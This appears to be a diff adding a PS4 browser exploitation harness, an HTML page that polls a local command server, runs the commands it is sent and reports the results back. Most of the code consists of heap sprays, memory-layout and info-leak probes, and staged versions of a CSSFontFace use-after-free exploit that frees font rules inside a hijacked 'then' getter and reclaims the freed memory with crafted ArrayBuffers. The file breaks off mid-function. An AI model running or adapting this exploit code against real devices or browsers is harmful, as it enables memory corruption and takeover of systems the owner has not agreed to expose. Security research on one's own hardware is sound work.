@@ -1,0 +1,1118 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>PS4 Browser Agent - Tool B</title></head>
+<body>
+<h2>PS4 Browser Agent</h2>
+<div id="ver">v5 (stage1_v3)</div>
+<div id="status">Connecting...</div>
+<div id="log"></div>
+<script>
+var SERVER = 'http://192.168.100.2:8080';
+var el = document.getElementById('log');
+var statusEl = document.getElementById('status');
+var results = [];
+
+function log(m) {
+    var d = document.createElement('div');
+    d.textContent = '[' + new Date().toLocaleTimeString() + '] ' + m;
+    el.appendChild(d);
+    window.scrollTo(0, document.body.scrollHeight);
+}
+
+function sendResult(tag, data) {
+    try {
+        var x = new XMLHttpRequest();
+        x.open('GET', SERVER + '/result?tag=' + encodeURIComponent(tag) + '&r=' + encodeURIComponent(String(data)), false);
+        x.send();
+        log('SENT [' + tag + ']: ' + String(data).substring(0, 100));
+    } catch(e) {
+        log('SEND ERROR: ' + e);
+    }
+}
+
+function sendLog(m) {
+    try {
+        var x = new XMLHttpRequest();
+        x.open('GET', SERVER + '/log?m=' + encodeURIComponent(m), false);
+        x.send();
+    } catch(e) {}
+}
+
+function poll() {
+    try {
+        var x = new XMLHttpRequest();
+        x.open('GET', SERVER + '/poll', false);
+        x.send();
+        var resp = x.responseText;
+        if (resp && resp !== 'null') {
+            var cmd = JSON.parse(resp);
+            return cmd;
+        }
+    } catch(e) {
+        log('Poll error: ' + e);
+    }
+    return null;
+}
+
+// ============================================
+// AVAILABLE COMMANDS (executed on PS4 browser)
+// ============================================
+var commands = {
+    // System info
+    'info': function() {
+        var info = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            cookieEnabled: navigator.cookieEnabled,
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            deviceMemory: navigator.deviceMemory || 'N/A',
+            maxTouchPoints: navigator.maxTouchPoints,
+            screenW: screen.width,
+            screenH: screen.height,
+            windowW: window.innerWidth,
+            windowH: window.innerHeight,
+            devicePixelRatio: window.devicePixelRatio,
+            performance_memory: performance.memory ? {
+                jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
+                totalJSHeapSize: performance.memory.totalJSHeapSize,
+                usedJSHeapSize: performance.memory.usedJSHeapSize
+            } : 'N/A'
+        };
+        return JSON.stringify(info);
+    },
+    
+    // Check what APIs are available
+    'api_check': function() {
+        var apis = {};
+        var checks = [
+            'WebAssembly', 'SharedArrayBuffer', 'Atomics',
+            'WebGL', 'WebGL2', 'CanvasRenderingContext2D',
+            'WebSocket', 'Worker', 'SharedWorker', 'ServiceWorker',
+            'RTCPeerConnection', 'MediaDevices',
+            'IndexedDB', 'CacheStorage', 'localStorage',
+            'BigInt64Array', 'BigUint64Array',
+            'Proxy', 'WeakRef', 'FinalizationRegistry',
+            'crypto', 'PerformanceObserver', 'IntersectionObserver',
+            'MutationObserver', 'ResizeObserver'
+        ];
+        for (var i = 0; i < checks.length; i++) {
+            try {
+                apis[checks[i]] = typeof window[checks[i]] !== 'undefined';
+            } catch(e) {
+                apis[checks[i]] = 'error';
+            }
+        }
+        return JSON.stringify(apis);
+    },
+
+    // Heap spray with TypedArrays
+    'spray': function(count, size) {
+        count = parseInt(count) || 100;
+        size = parseInt(size) || 256;
+        var spray = [];
+        for (var i = 0; i < count; i++) {
+            var ab = new ArrayBuffer(size);
+            var view = new Float64Array(ab);
+            view[0] = 0x4141414141414141;
+            view[1] = i;
+            spray.push(ab);
+        }
+        return 'Sprayed ' + spray.length + ' ArrayBuffers of ' + size + ' bytes';
+    },
+
+    // Read memory at address (via TypedArray view)
+    'read_mem': function(addr_hex, size) {
+        // Limited - can only read ArrayBuffer contents
+        // Need to find overlapping objects
+        return 'read_mem: requires exploit primitive first';
+    },
+
+    // Test specific browser feature
+    'test_feature': function(name) {
+        try {
+            switch(name) {
+                case 'sharedarraybuffer':
+                    var sab = new SharedArrayBuffer(8);
+                    var view = new Int32Array(sab);
+                    Atomics.store(view, 0, 42);
+                    return 'SharedArrayBuffer: OK, value=' + Atomics.load(view, 0);
+                
+                case 'wasm':
+                    var bytes = new Uint8Array([0,1,2,3]);
+                    try {
+                        var mod = new WebAssembly.Module(bytes);
+                        return 'WASM: Module created (bytes may be invalid)';
+                    } catch(e) {
+                        return 'WASM: ' + e.message;
+                    }
+
+                case 'webworker':
+                    var blob = new Blob(['self.postMessage("hello")'], {type: 'application/javascript'});
+                    var url = URL.createObjectURL(blob);
+                    var w = new Worker(url);
+                    return 'Worker: created OK';
+
+                case 'indexeddb':
+                    return 'IndexedDB: ' + (window.indexedDB ? 'available' : 'not available');
+
+                case 'crypto':
+                    if (window.crypto && window.crypto.getRandomValues) {
+                        var arr = new Uint8Array(8);
+                        window.crypto.getRandomValues(arr);
+                        return 'Crypto: OK, random=' + Array.from(arr).join(',');
+                    }
+                    return 'Crypto: not available';
+
+                default:
+                    return 'Unknown feature: ' + name;
+            }
+        } catch(e) {
+            return 'Error: ' + e.constructor.name + ': ' + (e.message||'').substring(0,80);
+        }
+    },
+
+    // Create TransformStream confusion (our CVE)
+    'cve_test': function() {
+        var results = [];
+        var orig = Array.prototype[Symbol.iterator];
+        try {
+            var arr = [new Uint8Array(16), null, null];
+            arr[Symbol.iterator] = function() {
+                var a = this, i = 0;
+                return { next: function() {
+                    if (i >= a.length) return {done:true};
+                    return {value: a[i++], done:false};
+                }};
+            };
+            var ts = new TransformStream(arr);
+            var w = ts.writable.getWriter();
+            var ds = w.desiredSize;
+            results.push('TransformStream OK, desiredSize=' + ds);
+            w.write('test');
+            results.push('Write OK');
+        } catch(e) {
+            results.push('Error: ' + e.constructor.name + ': ' + (e.message||'').substring(0,60));
+        }
+        return results.join('; ');
+    },
+
+    // Allocate and explore ArrayBuffer layout
+    'explore_layout': function() {
+        var info = [];
+        // Allocate specific sized buffers and check if we can detect layout
+        var bufs = [];
+        for (var i = 0; i < 10; i++) {
+            bufs.push(new ArrayBuffer(256));
+        }
+        // Fill with patterns
+        for (var i = 0; i < bufs.length; i++) {
+            var view = new Uint8Array(bufs[i]);
+            for (var j = 0; j < view.length; j++) {
+                view[j] = (i * 16 + j) & 0xFF;
+            }
+        }
+        // Check if any buffer was overwritten (overlap detection)
+        var overlaps = 0;
+        for (var i = 0; i < bufs.length; i++) {
+            var view = new Uint8Array(bufs[i]);
+            var expected = (i * 16) & 0xFF;
+            if (view[0] !== expected) {
+                overlaps++;
+                info.push('Buffer ' + i + ' corrupted! expected=' + expected + ' got=' + view[0]);
+            }
+        }
+        info.push('Checked ' + bufs.length + ' buffers, overlaps=' + overlaps);
+        return info.join('; ');
+    },
+
+    // Check navigator/plugins
+    'plugins': function() {
+        var plugins = [];
+        for (var i = 0; i < navigator.plugins.length; i++) {
+            plugins.push(navigator.plugins[i].name);
+        }
+        return JSON.stringify(plugins);
+    },
+
+    // Check performance timing
+    'timing': function() {
+        var t = performance.timing;
+        return JSON.stringify({
+            navigationStart: t.navigationStart,
+            domContentLoaded: t.domContentLoadedEventEnd - t.navigationStart,
+            loadComplete: t.loadEventEnd - t.navigationStart,
+            now: performance.now()
+        });
+    },
+
+    // Advanced: Heap spray with address detection via TypedArray views
+    'heap_spray_detect': function(count, size) {
+        count = parseInt(count) || 500;
+        size = parseInt(size) || 0x100;
+        var bufs = [];
+        var views = [];
+        // Spray
+        for (var i = 0; i < count; i++) {
+            var ab = new ArrayBuffer(size);
+            var v = new Float64Array(ab);
+            v[0] = 0xDEAD + i; // unique marker per buffer
+            v[1] = 0xCAFEBABE;
+            bufs.push(ab);
+            views.push(v);
+        }
+        // Free every other one to create holes
+        var freed = [];
+        for (var i = 0; i < count; i += 2) {
+            freed.push(bufs[i]);
+            bufs[i] = null;
+            views[i] = null;
+        }
+        // Fill holes with new smaller allocations
+        var filler = [];
+        for (var i = 0; i < count; i += 2) {
+            var ab = new ArrayBuffer(size);
+            var v = new Uint8Array(ab);
+            v[0] = 0x41; // 'A'
+            filler.push(ab);
+            bufs[i] = ab;
+            views[i] = v;
+        }
+        // Check surviving original buffers for corruption
+        var corrupted = 0;
+        for (var i = 1; i < count; i += 2) {
+            if (views[i] && views[i][0] !== (0xDEAD + i)) {
+                corrupted++;
+            }
+        }
+        return JSON.stringify({total: count, freed: freed.length, filler: filler.length, corrupted: corrupted});
+    },
+
+    // FinalizationRegistry test - detect GC of specific objects
+    'finreg_test': function() {
+        if (typeof FinalizationRegistry === 'undefined') return 'FinalizationRegistry not available';
+        var collected = [];
+        var registry = new FinalizationRegistry(function(heldValue) {
+            collected.push(heldValue);
+        });
+        // Register some objects
+        for (var i = 0; i < 10; i++) {
+            var obj = {id: i};
+            registry.register(obj, 'obj_' + i);
+        }
+        // Force GC by allocating large amounts
+        try {
+            var large = [];
+            for (var i = 0; i < 100; i++) {
+                large.push(new ArrayBuffer(1024 * 1024));
+            }
+            large = null;
+        } catch(e) {}
+        return JSON.stringify({collected: collected, count: collected.length});
+    },
+
+    // WeakRef test - detect object liveness
+    'weakref_test': function() {
+        if (typeof WeakRef === 'undefined') return 'WeakRef not available';
+        var refs = [];
+        var objects = [];
+        // Create objects and weak references
+        for (var i = 0; i < 20; i++) {
+            var obj = {id: i, data: new ArrayBuffer(256)};
+            objects.push(obj);
+            refs.push(new WeakRef(obj));
+        }
+        // Check which are alive
+        var alive = 0;
+        for (var i = 0; i < refs.length; i++) {
+            if (refs[i].deref()) alive++;
+        }
+        // Drop all strong refs
+        objects = null;
+        // Force GC
+        try {
+            var tmp = [];
+            for (var i = 0; i < 100; i++) tmp.push(new ArrayBuffer(1024 * 1024));
+            tmp = null;
+        } catch(e) {}
+        // Check alive after GC
+        var aliveAfterGC = 0;
+        for (var i = 0; i < refs.length; i++) {
+            if (refs[i].deref()) aliveAfterGC++;
+        }
+        return JSON.stringify({beforeGC: alive, afterGC: aliveAfterGC, total: refs.length});
+    },
+
+    // Worker-based heap spray - spray from a separate thread
+    'worker_spray': function(count, size) {
+        count = parseInt(count) || 200;
+        size = parseInt(size) || 256;
+        return new Promise(function(resolve) {
+            var blob = new Blob(['var bufs = [];' +
+                'for (var i = 0; i < ' + count + '; i++) {' +
+                '  var ab = new ArrayBuffer(' + size + ');' +
+                '  var v = new Float64Array(ab);' +
+                '  v[0] = 0xDEADBEEF;' +
+                '  bufs.push(ab);' +
+                '}' +
+                'self.postMessage({sprayed: bufs.length, size: ' + size + '});'
+            ], {type: 'application/javascript'});
+            var url = URL.createObjectURL(blob);
+            var w = new Worker(url);
+            w.onmessage = function(e) {
+                resolve(JSON.stringify(e.data));
+                URL.revokeObjectURL(url);
+            };
+            w.onerror = function(e) {
+                resolve('Worker error: ' + e.message);
+                URL.revokeObjectURL(url);
+            };
+            setTimeout(function() { resolve('Worker timeout'); }, 3000);
+        });
+    },
+
+    // Object address correlation - try to detect heap addresses
+    'addr_correlate': function() {
+        // Allocate typed arrays and check their byte patterns
+        // This helps determine if addresses are ASLR'd consistently
+        var results = [];
+        for (var trial = 0; trial < 5; trial++) {
+            var bufs = [];
+            for (var i = 0; i < 10; i++) {
+                bufs.push(new ArrayBuffer(256));
+            }
+            // Read first few bytes of each buffer as potential address info
+            for (var i = 0; i < bufs.length; i++) {
+                var v = new Uint8Array(bufs[i]);
+                v[0] = i;
+                v[1] = trial;
+            }
+            // Force some GC
+            bufs = bufs.filter(function(_, i) { return i % 2 === 0; });
+            
+            // Allocate new ones in the freed slots
+            var newBufs = [];
+            for (var i = 0; i < 5; i++) {
+                newBufs.push(new ArrayBuffer(256));
+            }
+            // Check if new buffers overlap with old ones
+            var overlaps = 0;
+            for (var i = 0; i < newBufs.length; i++) {
+                var v = new Uint8Array(newBufs[i]);
+                if (v[0] !== 0) overlaps++;
+            }
+            results.push({trial: trial, newBufs: newBufs.length, overlaps: overlaps});
+        }
+        return JSON.stringify(results);
+    },
+
+    // DOM-based info leak attempt - use error stacks
+    'error_stack_leak': function() {
+        var leaks = [];
+        try {
+            // Get error stack to leak addresses
+            var e = new Error('test');
+            leaks.push('stack: ' + (e.stack || 'none').substring(0, 200));
+        } catch(ex) {}
+        try {
+            // Call toString on internal objects
+            var arr = new ArrayBuffer(8);
+            leaks.push('ArrayBuffer toString: ' + arr.toString());
+            leaks.push('ArrayBuffer constructor: ' + arr.constructor.toString().substring(0, 100));
+        } catch(ex) {}
+        try {
+            // Check if Error.prepareStackTrace exists
+            leaks.push('prepareStackTrace: ' + typeof Error.prepareStackTrace);
+        } catch(ex) {}
+        return leaks.join(' | ');
+    },
+
+    // Test Atomics for potential race conditions
+    'atomics_test': function() {
+        var sab = new ArrayBuffer(8);
+        var view = new Int32Array(sab);
+        view[0] = 0;
+        var results = [];
+        // Test Atomics operations
+        Atomics.store(view, 0, 42);
+        results.push('store: ' + Atomics.load(view, 0));
+        Atomics.add(view, 0, 8);
+        results.push('add: ' + Atomics.load(view, 0));
+        Atomics.exchange(view, 0, 100);
+        results.push('exchange: ' + Atomics.load(view, 0));
+        // Test CAS
+        var expected = 100;
+        var CAS = Atomics.compareExchange(view, 0, expected, 200);
+        results.push('CAS: old=' + CAS + ' new=' + Atomics.load(view, 0));
+        return results.join('; ');
+    },
+
+    // Check if we can detect object addresses via property access patterns
+    'object_id_test': function() {
+        var objects = [];
+        var ids = [];
+        for (var i = 0; i < 100; i++) {
+            objects.push({x: i});
+        }
+        // Try to detect identity hash
+        for (var i = 0; i < Math.min(10, objects.length); i++) {
+            try {
+                // Attempt to get hidden class info via various means
+                var s = '' + objects[i];
+                ids.push(s);
+            } catch(e) {}
+        }
+        objects = null;
+        return 'Strings: ' + ids.join(', ');
+    },
+
+    // Quick FontFace API surface probe (sync)
+    'uaf_api_probe': function() {
+        var out = [];
+        out.push('FontFace=' + typeof FontFace);
+        out.push('document.fonts=' + typeof document.fonts);
+        out.push('FontFaceSet.load=' + (document.fonts && typeof document.fonts.load));
+        out.push('FontFace.prototype.then=' + typeof FontFace.prototype.then);
+        out.push('BigInt=' + typeof BigInt);
+        out.push('DataView.setBigUint64=' + typeof DataView.prototype.setBigUint64);
+        out.push('getBigUint64=' + typeof DataView.prototype.getBigUint64);
+        out.push('BigInt64Array=' + typeof BigInt64Array);
+        try {
+            var f = new FontFace('probe', 'local(Helvetica)', {});
+            out.push('ctor OK, family=' + f.family + ' status=' + f.status + ' ur=' + f.unicodeRange + ' fs=' + String(f.featureSettings));
+        } catch(e) { out.push('ctor ERR: ' + e); }
+        try {
+            var saved = document.fonts.size;
+            out.push('document.fonts.size=' + saved);
+        } catch(e) {}
+        return out.join(' | ');
+    },
+
+    // ============================================================
+    // STAGE 1: CSSFontFace UAF trigger test (CSSFontFace-Exploit port)
+    // Determines whether the FontFaceSet::load matchingFaces UAF
+    // fires on this firmware, and whether ArrayBuffer reclaim works.
+    // ============================================================
+    'stage1_uaf': function() {
+        return (function() {
+            return new Promise(function(resolve) {
+                var out = [];
+                function push(m) { out.push(m); sendLog('S1: ' + m); }
+                var timer = setTimeout(function() { push('HARD TIMEOUT'); resolve(out.join('\n')); }, 25000);
+
+                (async function() {
+                    try {
+                        push('UA=' + navigator.userAgent);
+                        if (typeof FontFace === 'undefined') { push('ABORT: no FontFace'); return; }
+                        push('BigInt=' + typeof BigInt + ' setBigUint64=' + typeof DataView.prototype.setBigUint64);
+
+                        // ---- PHASE 1: basic load path on this firmware ----
+                        push('PHASE1: basic document.fonts.load path...');
+                        var a1 = new FontFace('aa', 'local(Helvetica)', {});
+                        document.fonts.add(a1);
+                        var style1 = document.createElement('style');
+                        document.head.appendChild(style1);
+                        style1.sheet.insertRule('@font-face{font-family:bb;src:url(nonexistent.woff);unicode-range:U+0042;}', 0);
+                        document.body.offsetTop;
+                        var res1;
+                        try {
+                            res1 = await document.fonts.load('1em aa, bb', 'AB');
+                            push('PHASE1 loaded, len=' + res1.length);
+                            for (var i = 0; i < res1.length; i++) {
+                                push('  f[' + i + '] family=' + res1[i].family + ' status=' + res1[i].status + ' ur=' + res1[i].unicodeRange);
+                            }
+                        } catch(e) {
+                            push('PHASE1 load rejected: ' + e);
+                            push('  (not fatal, continuing)');
+                        }
+                        try { document.fonts.delete(a1); } catch(e) {}
+                        while (style1.sheet.cssRules.length) { try { style1.sheet.deleteRule(0); } catch(e) { break; } }
+
+                        // ---- PHASE 2: UAF trigger ----
+                        push('PHASE2: UAF trigger (deleteRule rebuild during load)...');
+                        var spray_count = 0x80;
+                        var spray_font_rule = '@font-face{font-family:spray;src:local(Helvetica Bold);unicode-range:U+0043;}';
+                        var uaf_font_rule = '@font-face{font-family:b;src:url(nonexistent-font.woff);unicode-range:U+0042;}';
+                        var abs = [];
+                        var thenFires = 0;
+                        var A = new FontFace('a', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+                        document.fonts.add(A);
+                        void A.loaded;
+                        var style = document.createElement('style');
+                        document.head.appendChild(style);
+                        var idx;
+                        for (idx = 0; idx < spray_count / 4; idx++) style.sheet.insertRule(spray_font_rule, style.sheet.cssRules.length);
+                        var uaf_idx = style.sheet.cssRules.length;
+                        style.sheet.insertRule(uaf_font_rule, style.sheet.cssRules.length);
+                        for (idx = spray_count / 4; idx < spray_count; idx++) style.sheet.insertRule(spray_font_rule, style.sheet.cssRules.length);
+                        try { document.body.offsetTop; } catch(e) {}
+                        push('rules: total=' + style.sheet.cssRules.length + ' uaf_idx=' + uaf_idx);
+
+                        var old_then = FontFace.prototype.then;
+                        Object.defineProperty(FontFace.prototype, 'then', {
+                            configurable: true,
+                            get: function() {
+                                thenFires++;
+                                if (this === A) {
+                                    push('THEN GETTER fired on A -- executing free+spray');
+                                    try { style.sheet.deleteRule(0); } catch(e) { push('  del0 err ' + e); }
+                                    try { document.body.offsetTop; } catch(e) {}
+                                    for (idx = spray_count - 1; idx > 0; idx--) {
+                                        if (idx !== uaf_idx) { try { style.sheet.deleteRule(idx); } catch(e) {} }
+                                    }
+                                    try { document.body.offsetTop; } catch(e) {}
+                                    var sizes = [];
+                                    var s;
+                                    for (s = 0xa0; s <= 0xe0; s += 8) sizes.push(s);
+                                    push('  ArrayBuffer spray sizes: ' + sizes.join(','));
+                                    for (var si = 0; si < sizes.length; si++) {
+                                        for (var n = 0; n < 0x40; n++) {
+                                            abs.push(new ArrayBuffer(sizes[si]));
+                                        }
+                                    }
+                                    push('  sprayed ' + abs.length + ' ArrayBuffers');
+                                }
+                                return undefined;
+                            }
+                        });
+
+                        var fonts;
+                        try {
+                            fonts = await document.fonts.load('1em a, b', 'AB');
+                        } catch(e) {
+                            push('PHASE2 load threw: ' + e);
+                        }
+                        Object.defineProperty(FontFace.prototype, 'then', { configurable: true, value: old_then });
+                        push('then getter fired ' + thenFires + 'x');
+                        push('load result len=' + (fonts ? fonts.length : 'N/A'));
+                        if (fonts) {
+                            for (idx = 0; idx < fonts.length; idx++) {
+                                push('  f[' + idx + '] status=' + fonts[idx].status + ' ur=' + fonts[idx].unicodeRange + ' fs=' + String(fonts[idx].featureSettings));
+                            }
+                        }
+
+                        // ---- PHASE 3: detection oracles ----
+                        var foundUAF = false;
+                        if (fonts) {
+                            for (idx = 0; idx < fonts.length; idx++) {
+                                if (fonts[idx].unicodeRange === 'U+0-10FFFF') {
+                                    foundUAF = true;
+                                    push('UAF FONT: idx=' + idx + ' status=' + fonts[idx].status + ' fs=' + String(fonts[idx].featureSettings));
+                                }
+                            }
+                            if (!foundUAF) push('no font with default unicodeRange U+0-10FFFF in result');
+                        }
+                        var reclaimed = [];
+                        for (idx = 0; idx < abs.length; idx++) {
+                            try {
+                                var dv = new DataView(abs[idx]);
+                                if (dv.getBigUint64(8, true) === 2n) {
+                                    reclaimed.push(idx);
+                                    var hdr = [];
+                                    for (var b = 0; b < 0x40; b += 8) hdr.push(dv.getBigUint64(b, true).toString(16));
+                                    push('RECLAIMED: idx=' + idx + ' size=' + abs[idx].byteLength + ' hdr=' + hdr.join(' '));
+                                }
+                            } catch(e) {}
+                        }
+                        push('reclaimed(refcount==2) count=' + reclaimed.length + ' / ' + abs.length);
+
+                        var near = [];
+                        for (idx = 0; idx < abs.length && near.length < 8; idx++) {
+                            try {
+                                var v = new DataView(abs[idx]).getBigUint64(8, true);
+                                if (v >= 1n && v <= 3n) near.push(idx + '@' + v.toString());
+                            } catch(e) {}
+                        }
+                        push('buffers with refcount 1..3: ' + near.join(' '));
+                    } catch(e) {
+                        push('FATAL: ' + e + ' | ' + (e && e.stack || ''));
+                    } finally {
+                        clearTimeout(timer);
+                        resolve(out.join('\n'));
+                    }
+                })();
+            });
+        })();
+    },
+
+    // STAGE 1B: crash-tolerant UAF trigger + in-getter reclaim scan
+    // Scans the sprayed buffers for the freed CSSFontFace IMMEDIATELY after
+    // the free+spray (inside the then-getter), before the load machinery
+    // resumes, then races the hung load with a timeout.
+    'stage1_v2': function() {
+        return (function() {
+            return new Promise(function(resolve) {
+                var out = [];
+                function push(m) { out.push(m); sendLog('S2: ' + m); }
+                var done = false;
+                function finish() { if (!done) { done = true; resolve(out.join('\n')); } }
+                var timer = setTimeout(finish, 30000);
+
+                (async function() {
+                    try {
+                        var spray_count = 0x80;
+                        var spray_font_rule = '@font-face{font-family:spray;src:local(Helvetica Bold);unicode-range:U+0043;}';
+                        var uaf_font_rule = '@font-face{font-family:b;src:url(nonexistent-font.woff);unicode-range:U+0042;}';
+                        var abs = [];
+                        var thenFires = 0;
+                        var A = new FontFace('a', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+                        document.fonts.add(A);
+                        void A.loaded;
+                        var style = document.createElement('style');
+                        document.head.appendChild(style);
+                        var idx;
+                        for (idx = 0; idx < spray_count / 4; idx++) style.sheet.insertRule(spray_font_rule, style.sheet.cssRules.length);
+                        var uaf_idx = style.sheet.cssRules.length;
+                        style.sheet.insertRule(uaf_font_rule, style.sheet.cssRules.length);
+                        for (idx = spray_count / 4; idx < spray_count; idx++) style.sheet.insertRule(spray_font_rule, style.sheet.cssRules.length);
+                        try { document.body.offsetTop; } catch(e) {}
+                        push('trigger set up, uaf_idx=' + uaf_idx);
+
+                        var old_then = FontFace.prototype.then;
+                        Object.defineProperty(FontFace.prototype, 'then', {
+                            configurable: true,
+                            get: function() {
+                                thenFires++;
+                                if (this === A) {
+                                    push('THEN on A: free+spray');
+                                    try { style.sheet.deleteRule(0); } catch(e) {}
+                                    try { document.body.offsetTop; } catch(e) {}
+                                    for (idx = spray_count - 1; idx > 0; idx--) {
+                                        if (idx !== uaf_idx) { try { style.sheet.deleteRule(idx); } catch(e) {} }
+                                    }
+                                    try { document.body.offsetTop; } catch(e) {}
+                                    var sizes = [];
+                                    var s;
+                                    for (s = 0x98; s <= 0x130; s += 8) sizes.push(s);
+                                    for (var si = 0; si < sizes.length; si++) {
+                                        for (var n = 0; n < 0x20; n++) {
+                                            abs.push(new ArrayBuffer(sizes[si]));
+                                        }
+                                    }
+                                    push('sprayed ' + abs.length + ' (sizes ' + sizes[0].toString(16) + '..' + sizes[sizes.length-1].toString(16) + ')');
+
+                                    // ---- IN-GETTER RECLAIM SCAN (crash-safe) ----
+                                    var hits = [];
+                                    for (var zi = 0; zi < abs.length; zi++) {
+                                        try {
+                                            var dv = new DataView(abs[zi]);
+                                            var v0 = dv.getBigUint64(0, true);
+                                            var v8 = dv.getBigUint64(8, true);
+                                            if ((v0 >= 1n && v0 <= 4n) || (v8 >= 1n && v8 <= 4n)) {
+                                                var hdr = [];
+                                                for (var b = 0; b < 0x30; b += 8) hdr.push(dv.getBigUint64(b, true).toString(16));
+                                                hits.push('idx=' + zi + ' sz=' + abs[zi].byteLength.toString(16) + ' [0]=' + v0.toString() + ' [8]=' + v8.toString() + ' hdr=' + hdr.join(' '));
+                                            }
+                                        } catch(e) {}
+                                    }
+                                    push('reclaim scan: ' + hits.length + ' candidates');
+                                    for (var hi = 0; hi < hits.length; hi++) push('  HIT ' + hits[hi]);
+                                    if (hits.length === 0) {
+                                        // log a few control buffers to see what the freed object looks like
+                                        var cnt = 0;
+                                        for (zi = 0; zi < abs.length && cnt < 4; zi++) {
+                                            try {
+                                                var dvx = new DataView(abs[zi]);
+                                                var hd = [];
+                                                for (var b = 0; b < 0x20; b += 8) hd.push(dvx.getBigUint64(b, true).toString(16));
+                                                push('  ctl buf idx=' + zi + ' sz=' + abs[zi].byteLength.toString(16) + ' hdr=' + hd.join(' '));
+                                                cnt++;
+                                            } catch(e) {}
+                                        }
+                                    }
+                                }
+                                return undefined;
+                            }
+                        });
+
+                        var fonts;
+                        try {
+                            fonts = await Promise.race([
+                                document.fonts.load('1em a, b', 'AB'),
+                                new Promise(function(r){ setTimeout(function(){ r('__HUNG__'); }, 8000); })
+                            ]);
+                        } catch(e) {
+                            push('load rejected: ' + e);
+                        }
+                        Object.defineProperty(FontFace.prototype, 'then', { configurable: true, value: old_then });
+                        push('thenFires=' + thenFires);
+                        if (fonts === '__HUNG__') {
+                            push('LOAD HUNG (expected if reclaim missed)');
+                        } else if (fonts) {
+                            push('load resolved, len=' + fonts.length);
+                            for (idx = 0; idx < fonts.length; idx++) {
+                                push('  f[' + idx + '] status=' + fonts[idx].status + ' ur=' + fonts[idx].unicodeRange + ' fs=' + String(fonts[idx].featureSettings));
+                            }
+                        }
+                        push('document.fonts.size=' + document.fonts.size);
+                    } catch(e) {
+                        push('FATAL: ' + e);
+                    } finally {
+                        clearTimeout(timer);
+                        finish();
+                    }
+                })();
+            });
+        })();
+    },
+
+    // STAGE 1C: ArrayBuffer backing-store reuse/zeroing test.
+    // Decides whether backing stores are zeroed on this firmware.
+    's1_reuse': function() {
+        var out = [];
+        function push(m) { out.push(m); sendLog('R1: ' + m); }
+        try {
+            var sizes = [0xb8, 0xc0, 0xc8];
+            for (var si = 0; si < sizes.length; si++) {
+                var sz = sizes[si];
+                var N = 0x180;
+                var t = [];
+                for (var i = 0; i < N; i++) {
+                    var ab = new ArrayBuffer(sz);
+                    var u = new Uint8Array(ab);
+                    for (var j = 0; j < 8; j++) u[j] = 0x41;
+                    u[8] = (i % 256);
+                    u[9] = 0x42;
+                    t.push(ab);
+                }
+                t = null;
+                var press = [];
+                for (var i = 0; i < 60; i++) press.push(new ArrayBuffer(0x40000));
+                press = null;
+                var t2 = [];
+                var hits = [];
+                for (var i = 0; i < N; i++) {
+                    var ab = new ArrayBuffer(sz);
+                    var u = new Uint8Array(ab);
+                    var marker = 0;
+                    for (var j = 0; j < 8; j++) { if (u[j] === 0x41) marker++; }
+                    if (marker >= 4) hits.push(i + ':m' + marker);
+                    t2.push(ab);
+                }
+                push('size 0x' + sz.toString(16) + ': realloc hits=' + hits.length + '/' + N + ' first=' + hits.slice(0, 6).join(' '));
+            }
+        } catch(e) { push('ERR: ' + e); }
+        return out.join('\n');
+    },
+
+    // STAGE 1D: UAF + pre-set fake object, sequential layout candidates.
+    // Pre-sets refcount=1 (+ optional status) into every sprayed buffer so the
+    // hung load may complete; then scans for the buffer whose refcount got
+    // bumped to 2 by the load machinery and dumps it (layout leak).
+    'stage1_v3': function() {
+        return (function() {
+            return new Promise(function(resolve) {
+                var out = [];
+                function push(m) { out.push(m); sendLog('S3: ' + m); }
+                var done = false;
+                function finish() { if (!done) { done = true; clearTimeout(overall); resolve(out.join('\n')); } }
+                var overall = setTimeout(finish, 50000);
+
+                var addedFaces = [];
+                function cleanup() {
+                    try {
+                        for (var i = 0; i < addedFaces.length; i++) { try { document.fonts.delete(addedFaces[i]); } catch(e) {} }
+                        addedFaces = [];
+                    } catch(e) {}
+                    try { var st = document.querySelectorAll('style'); for (var i = 0; i < st.length; i++) st[i].remove(); } catch(e) {}
+                }
+
+                function runOne(cand) {
+                    return new Promise(function(roneResolve) {
+                        (async function() {
+                            try {
+                                var spray_count = 0x80;
+                                var spray_font_rule = '@font-face{font-family:spray;src:local(Helvetica Bold);unicode-range:U+0043;}';
+                                var uaf_font_rule = '@font-face{font-family:b;src:url(nonexistent-font.woff);unicode-range:U+0042;}';
+                                var abs = [];
+                                var A = new FontFace('a', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+                                document.fonts.add(A);
+                                addedFaces.push(A);
+                                void A.loaded;
+                                var style = document.createElement('style');
+                                document.head.appendChild(style);
+                                var idx;
+                                for (idx = 0; idx < spray_count / 4; idx++) style.sheet.insertRule(spray_font_rule, style.sheet.cssRules.length);
+                                var uaf_idx = style.sheet.cssRules.length;
+                                style.sheet.insertRule(uaf_font_rule, style.sheet.cssRules.length);
+                                for (idx = spray_count / 4; idx < spray_count; idx++) style.sheet.insertRule(spray_font_rule, style.sheet.cssRules.length);
+                                try { document.body.offsetTop; } catch(e) {}
+                                var old_then = FontFace.prototype.then;
+                                Object.defineProperty(FontFace.prototype, 'then', {
+                                    configurable: true,
+                                    get: function() {
+                                        if (this === A) {
+                                            try { style.sheet.deleteRule(0); } catch(e) {}
+                                            try { document.body.offsetTop; } catch(e) {}
+                                            for (idx = spray_count - 1; idx > 0; idx--) {
+                                                if (idx !== uaf_idx) { try { style.sheet.deleteRule(idx); } catch(e) {} }
+                                            }
+                                            try { document.body.offsetTop; } catch(e) {}
+                                            var nbuf = 0x40;
+                                            for (var n = 0; n < nbuf; n++) {
+                                                var ab = new ArrayBuffer(cand.size);
+                                                var dv = new DataView(ab);
+                                                dv.setBigUint64(8, 1n, true);
+                                                dv.setBigUint64(0, 1n, true);
+                                                if (cand.status !== null) {
+                                                    try { dv.setUint8(cand.status, 3); } catch(e) {}
+                                                }
+                                                abs.push(ab);
+                                            }
+                                            push('[' + cand.name + '] freed, sprayed ' + nbuf + ' x 0x' + cand.size.toString(16));
+                                        }
+                                        return undefined;
+                                    }
+                                });
+                                var fonts;
+                                var outcome = 'HUNG';
+                                try {
+                                    fonts = await Promise.race([
+                                        document.fonts.load('1em a, b', 'AB'),
